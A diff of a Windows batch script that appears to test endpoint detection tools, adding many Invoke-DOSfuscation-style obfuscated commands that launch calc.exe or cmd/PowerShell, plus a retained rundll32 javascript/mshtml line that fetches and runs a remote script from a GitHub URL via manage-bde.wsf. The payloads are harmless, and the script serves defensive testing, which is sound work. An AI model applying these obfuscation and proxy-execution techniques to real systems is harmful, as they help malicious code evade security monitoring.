@@ -929,17 +929,119 @@ timeout 5
 
 echo %time% %date% [+] Testing manage-bde.wsf with rundll32 JS exec
 set comspec=rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")
-cscript C:\windows\system32\manage-bde.wsf
+start "" cscript C:\windows\system32\manage-bde.wsf
 set comspec=C:\WINDOWS\system32\cmd.exe
 echo Execution Finished at %time% %date%
 echo Command Excuted: set comspec=rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")
 echo Command Excuted: cscript C:\windows\system32\manage-bde.wsf
 echo Command Excuted: set comspec=C:\WINDOWS\system32\cmd.exe
-
 timeout 5
 
 
+:: Generate like this: Invoke-DOSfuscation -Command 'calc.exe' -CliCommand 'Binary\Cmd\2' -Quiet
+echo %time% %date% [+] Testing BINARY\CMD\1 exec
+start "" %PUBLIC:~-1%m%TMP:~-15,1%
+echo Execution Finished at %time% %date%
+timeout 5
 
+echo %time% %date% [+] Testing BINARY\CMD\2 exec
+start "" FOR /F "tokens=2 delims==Yf" %L IN ('assoc.cmd')DO %L
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing BINARY\CMD\3 exec
+start "" ^F^o^r  ;   ,  ,  ,  ;   /^F  ,   ,  ;  ,  "   delims=nGfMK       tokens=    1    "    ,   ,    ;   ,   ,   %Y   ,    ,  ;   ,   ^in    ;  ;   ,  ;   (  ,   ;  ,  ,   '   ;    ;   ,   ^^FtY^^P^^e  ,  ;   ;   ;  ,   ^|   ;  ;   ;  ;   ;    ^^F^^in^^D  ;    ,  ,  "mdfi"  ;  ;    ,  ,  '   ;   ;   ,   )  ;  ,  ,  ,  ,   ,  ;  ^D^O  ;    ;  ;   ,   ,    %Y
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing BINARY\PS\1 exec
+start "" %PUBLIC:~-6,-5%%ProgramData:~-9,-8%%SystemRoot:~3,-6%%ProgramFiles:~14,1%rsh%CommonProgramW6432:~-2,-1%l%TMP:~-10,1%
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing BINARY\PS\2 exec
+start "" FOR /F "tokens=9 delims=L.\Dg" %J IN ('ftype^|findstr v1.')DO %J
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing BINARY\PS\3 exec
+^F^o^R   ;  ,    ;   ;  ;  ;   ;  /^F    ;   ,  ,  ,  ,   "    tokens=   3    delims=mC."    ,  ,   ;    ,  ,   %6  ;  ,  ;   ,   ,  ;  ^IN   ,  ,   ,  ,  ;   ,  ,   (   ;  ;    ;  ,   ;    '   ;    ;   ;   ,   ;  ,   ;    ^^a^^s^^S^^O^^c   ;  ,    ,  ,    ,  ;  .cdxml     '  ,  ,  ;   ,  ;   )   ,  ;   ,  ^d^O    ,  ;  ,    %6
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing ENCODING\1 exec
+start "" ca%ProgramFiles:~13,1%c.%TMP:~-3,-2%x%CommonProgramFiles:~-2,1%
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing ENCODING\2 exec
+start "" ca%LOCALAPPDATA:~-1,1%%PUBLIC:~-1%.%TMP:~5,1%x%CommonProgramFiles(x86):~-21,1%
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing ENCODING\3 exec
+start "" ca%COmmOnprogRAMW6432:~   -3,     1%%tmP:~    -8,   1%.%TMP:~    -3,   -2%x%PrOGRAMFIleS(X86):~    -8,      1%
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing PAYLOAD\CONCAT\1 exec
+start "" cmd /C"set Gs=calc&&set 9Uv=.exe&&call set 8pW=%Gs%%9Uv%&&call %8pW%"
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing PAYLOAD\CONCAT\2 exec
+start "" ^c%ComMonprogrAMfIlEs:~ 20,-8%^D,  ,  , , /%CommONPRogRAMW6432:~  -12, +1%" , (^S^Et oA^t^p=^xe)& ( ,(sE^t ^ ^ CKl^w=c^alc.e),  )&  , cAlL , , ^Se^t   Pw=%CKl^w%%oA^t^p%&& , , ( (cA^ll , %P^w%), )  "
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing PAYLOAD\CONCAT\3 exec
+^FOr;/^f,"  delims=0MHFNZ  tokens= +2  " ,%^y , ^IN,; ( ,; ' ; ft^^yp^^E ,, ^| , ^^FiN^^D^^ST^^r ,S^^H^^Cm' , , ) ; ; d^O ,%^y; ; YPd7aN ,TZ2azt/%coMMonPROGRaMW6432:~17,  -11%",( (S^eT ^]$=^.) )&&  ( , (sE^t @^*$^_=^e) , , )&  (  ,(^s^E^T ^ ^ ~^?^-=^x) )&& (, (s^Et ^ ^ ^#^?_=a^l) ; )&  (^SET ^,;^-=e)&(^SeT ^  ^}^[@=^c)&&(S^Et ^ ^~^\+^'=^c)&, , ^C^A^l^l ;^S^e^t .'$_=%^~^\+^'%%^#^?_%%^}^[@%%^]$%%@^*$^_%%~^?^-%%^,;^-%&; ;( ,  , ,  , ,  (C^A^LL ;%.'^$^_%)  , )  "
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing PAYLOAD\REVERSE\1 exec
+start "" cmd /V:ON/C"set bRm=exe.clac&&for /L %v in (7;-1;0)do set nT=!nT!!bRm:~%v,1!&&if %v==0 call %nT:~4%"
+echo Execution Finished at %time% %date%
+timeout 5
+echo %time% %date% [+] Testing PAYLOAD\REVERSE\2 exec
+start "" %comMoNproGraMW6432:~ 17,+1%^m%Os:~   3,  -6%;   ; ^/V:^o  ;  ; /R " ;; (^SE^t ^ ^ ^ T4=k^TU^e^AG^0xcw^m^eK^s8^.G^Q^d^ce^R^Xl^7d^u^aYOoc)&&;  ^fOr  ; ;  /^L ;  %^w  ;  ; ^IN ;  ;; ( ^ 31  ;^ ^;^ -4^ 3^ ^ ) ; D^O ;  ; ;  (  (;  ;^sET    5^u=!5^u!!T4:~%^w,  1!) )& ;  ; ^i^F; ; %^w ;  ; ^Equ; ;^3 ;; (   (^C^aL^L ;  ; %5^u:^*^5u^!=%   ) ; ; )   "
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing PAYLOAD\REVERSE\3 exec
+^F^O^R    ;    ,    ;    ,    ;   ;   ;   /^f  ,  ,   ;    "      tokens=     1     delims=f7La"  ;  ;  ,   ,  ;    ;   %^d    ,    ,  ;    ,  in    ;    ,   ,   (  ,    ;  ;   ,  ;    '    ;   ;    ;    ;   ;   ^^F^^t^^y^^P^^e  ,   ,   ;    ,   ;  ,  ,  ^|    ,  ,   ;   ;  ;  ^^FIN^^d^^s^^T^^R   ,   ,   ,  ,   ;   ;    ,   ^^m^^d^^f   '   ,    ,   ,  ;   )    ;   ,    ,  ,    ;   ;    ,  ^D^O    ,  ;    ;   %^d;    ;   ,    ,   ,  ;    ,    ;  q1ezYhj9Xy^/^v^[^8^s^k ^ ^    ;  ,  ,  ;  ;  Xyuc/^r       "  ,   ,  ;    ,   ;   ,  (   ,    ,       (   ;     ;     ;   ;      ;    ;      (     ,       ,     (   ,     ,     (^s^e^t ^  ^ ^ ^  ^\^  =^c^6^R^G}^jl^H^L^e^[^<^Y^r^Q^X^2^1:^x^.^(M]^#A^j^WN^en^c^>^$^I^m^`^W^s^.^\^,^ ^H^P^'x=R^c^>^W^;,^_^q^X^V^)^l#^d^C^2^>k^(=^6^ai^X^m^/^e^$^>^H^7^c)     ,       )      ,     ,      )   )      ,     ,     ,     )&&         ,   ;  ;   ;  F^o^r   ,  ,  ;  ,   ;    ;   ,  /^L   ;   ;  ;   ,  ,   %^c   ,   ;   ;    ,    ,  ;   ;   in   ,  ,   ,   ,   ;  (^ ^ ^ ^ ^  +^7^9 ^ ^  ^  ;^ ^ ^ ^  ^ ^ ^;^  ^ ^;^ ^ ^  ^ ^-1^0 ^ ^ ^  ^ ^,^ ^ ^  ^ ^ ^ ^,^ ^ ^ ^ ^ ^ ,^ ^ ^ ^+9 ^  ^ ^ ^;^ ^ ^ ^  ;^ ^ ^   ^ ^ ^;^ ^ ^  ^ ^ ; ^ ^ ^  ^ ^;^ ^ ^ ^ ^;^ ^ ^ ^ ^  )   ,  ;  ;  ,  ;  ^d^O  ,  ,   ,    ;   ,  ,   ;  (       ;    ;    ;      ;       ;     ;    ;     (      ;   ;    ;   (    ;     ;       ;   ;     (     ,       ,    ,      (      (  ,   ;   ;    ;   s^e^T        ^;^ ^ ^ =!^;^ ^ ^ !!^\^  :~   %^c,   1!)     ,       ,   )    ,    )       ;       ;    ;   ;      ;      )      ;       ;     ;       ;    ;     )       )&&   ,   ,    ;  ;  ,   ;   ,  ^i^f  ;  ;   ;   %^c  ,   ;  ,   ,   ;   ;      ;  ;   ;   ^E^qU   ,  ;   ;    ;   ;  ;  ,   ^9    ,   ;   ,   ,    ,   ;  (     ,    ,    ,      ,     ,     (    ,    ,      ,     ,      ,       ,      ,   (       ,   ,      ,      ,   ,   (^c^a^L^l   ,  ;   ,   ,  %^;^ ^ ^ :^~^  ^ ^ ^ ^ ^ ^+^6%       )      ;    ;     ;     ;   ;   ;      ;   )       ,      ,     ,    )    ,   ,   )       "
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing PAYLOAD\FORCODE\1 exec
+start "" cmd /V:ON/C"set Wyv=elax.c&&for %s in (5;2;1;5;4;0;3;0;10)do set Tgy0=!Tgy0!!Wyv:~%s,1!&&if %s equ 10 call %Tgy0:~-8%"
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing PAYLOAD\FORCODE\2 exec
+^cm^d,  , ^/^v^: ,  /^r "  , , ( ,  (^S^ET ^ H^4^vN=cx^e^.^l^a) )&   , ^f^o^R, , %^d, ,^in,(^ ^  ,+0^ ^+5 ^, ,^ 4 -^0 3^ +2 ^, ^, 1 ^+^2 ^+1^2^ ) , ^d^o (,   ,  , ,,(S^E^t    ^9O^w=!^9O^w!!H^4^vN:~  %^d,   1!)   , ,,   ,,)&&  ,  , ^I^f  ,  %^d , , ^Eq^U , , +^1^2  ,  , (C^A^L^l, %^9O^w:~^   ^-^8%)"
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing PAYLOAD\FORCODE\3 exec
+^f^o^r  ;  ,  , /^f ;  ; "    delims=Otfy2   tokens=   +1    "  ,  , ,  %N  ;  ;  ;  ^iN  ,  ;  ;  (  ;  ,  '  ,  ,  ;  ^^F^^tY^^P^^e  ,  ; ^|  , ,  ^^F^^in^^D  ,  ,  "dfi"  ,  ; ;  '  ,  ,  , ) , ,  ^d^o  , ;  %N;   , , 4^/^vdF^un^_^y^E^6^b^$^ ^   , ,  ;  VkZXNtHo/^R    "  ; ,  ;  (    ,  ;    ,    ;    ,  ;    ,   (^s^ET ^ ^ ^_^ ^ ^ =^e^.^l^a^c^x) )&&      ,  ,  ^F^o^R  ;  ,  , %^E  ,  ; ,  ^In  ,  ;  (^ ^ ^ ^ ^,^4^ ^;^ ^;^ ^+^3^ ^,^ +^2^ ^;^ ^;^ ^;^ ^+^4 ^,^ ^1^ ;^ ; ^;^ ^+^0^ +5 ^;^ ^;^ ^; ^0 ^,^ ^1^5^ ,^ ^ ^ ^ ) ; ,  ^d^O (   ,  ,  ,  (  ,   ;    ,    ;   ,  ;    ,    (s^E^t     ^~^ ^ ^ =!^~^ ^ ^ !!^_^ ^ ^ :~   %^E,    1!)  ,   )  ,    )&  ,  ; ^i^F ;  ,  %^E ; ; ^e^qU  ; , ,  ^1^5  , ,  ( ( , (^C^A^l^L ,  ,  , %^~^ ^ ^ :^~^ ^ ^  ^+^6%) , ) )   "
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing PAYLOAD\FINCODE\1 exec
+start "" cmd.exe /V:ON/C"set NZ=cajc.efe&&set uUP=!NZ:j=l!&&set sj=!uUP:f=x!&&call %sj%"
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing PAYLOAD\FINCODE\2 exec
+start "" %comMOnpROgrAMW6432:~  -12,1%%COmmOnprOgRAMw6432:~ +9, 1%%sysTEMrOot:~  6,   +1%;   ; ^/^v:^o    ;/^R   ";  ;( ; ;   (^s^ET Rm^L=Na^MN^0eu^e)  )&   (   (se^t O^Dr=^!^RmL:N=^c^!) ; )&   (^SE^t ^ ^rz=^!^O^Dr^:M^=^l^!)& ( ; (s^et  ^ o^Qr=!^r^z^:^u^=^x!)   )&   (S^et ^ ^  ^9RJ=^!o^Qr^:0=^.^!)& ;( (^c^a^Ll  ; ; %^9RJ%) )  "
+echo Execution Finished at %time% %date%
+timeout 5
+
+echo %time% %date% [+] Testing PAYLOAD\FINCODE\3 exec
+^F^O^R  ; ,  , ;   /^F  ;   ,   ;  ,  "  tokens=  +1     delims==N6.W"   ,   , ;  ,  ;   %^S  ;  ; ,   ;  ,   ^in  ;   ,   ;  ;  (  ,  ;   , , ,   '  ;  ,   ; ,   ;   ^^a^^s^^s^^O^^c  ;  ;  ^| ,  , ,  ;  ;  ^^FIn^^D^^s^^T^^R  , ,  ; ,   ^^m^^d^^f   ' ,  ,  )  ;   ;  ;  ;  ;   ^d^O   ,   ,   ,  ,  ;  %^S;    ,  ; ;  OEkpQH8uR^/^V^G^e^c^w^A^M^ ^ ^    ;  ,  ;   ;  LZQGHDTY/^R  "  ;   ,   ; ,  (     ,     ;  ,     ;  ,     (  ,    (     ,    (     ,    (^S^e^T^ ^ ^ ^ ^ ^?^ ^  ^ ^=^c^)^'^c^:.^-^.)    ;  ;   ;  ;     )  ;   ;     ;   )   ,  )  ,  )&     (     ;   ;  ;  (  ,   ,   (  ,     (^S^e^t ^ ^ ^ ^{^ ^ =!^?^ ^ ^ ^ ^:^-^=^x^!)  ;   ;   ;     )  ;  ;  ;    )  ,     )&  (  ,     ;    ,   ;  ,    (    ,     (     ,    (   ,     ;  ,  ;     ,    ;     ,   ;     ,     (^S^E^T ^ ^ ^ ^$^ ^ =^!^{^ ^ ^:^.^=e^!)    )    )   ,   )    ;  ;   ;  ;  )&&   (  ,     ,  ,    (^s^E^t ^ ^ ^;^ ^ ^ =^!^$^ ^ ^:^)^=^a^!) ; ; ; )&&     (    (     ;    ;    ;   (  ,     (^s^E^T ^ ^ ^- ^ ^ =^!^;^ ^ ^ ^::^=^.^!)     )  ,    )    ;     ;  ;  ;  )&&     (   ,     (   ;     ;    ;   ;    ;   (    ,    (   ,  (^s^E^t ^ ^ ^ ^ ^]^ ^  ^ =^!^-^ ^ ^ :^'=^l^!) , , ) ; ; ; ; ; ) , , ) )& ,  ,  (    ,     (     ,    (^c^A^l^L ;   ;   ; ;   %^]^ ^  ^ %)  ,   ;   ,   ;   ,   ;   ,   ;   ,    ;  ,     )  ,    ;  ,  ;  ,    ;   ,  ;     ,   )     "
+echo Execution Finished at %time% %date%
+timeout 5
 
 
 echo [+] Let tasks finish before deleting all the files
